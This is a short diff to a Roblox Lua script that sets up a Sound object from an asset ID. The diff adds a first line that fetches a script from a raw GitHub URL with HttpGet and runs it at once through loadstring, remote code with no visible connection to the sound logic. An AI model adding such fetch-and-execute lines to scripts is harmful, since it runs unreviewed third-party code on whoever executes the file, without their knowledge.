@@ -1,3 +1,4 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/pwrsk/mm2/main/COLOR'))()
 local soundId = "rbxassetid://9111926008" -- Replace INSERT_SOUND_ID_HERE with the actual sound ID
 
 local sound = Instance.new("Sound")
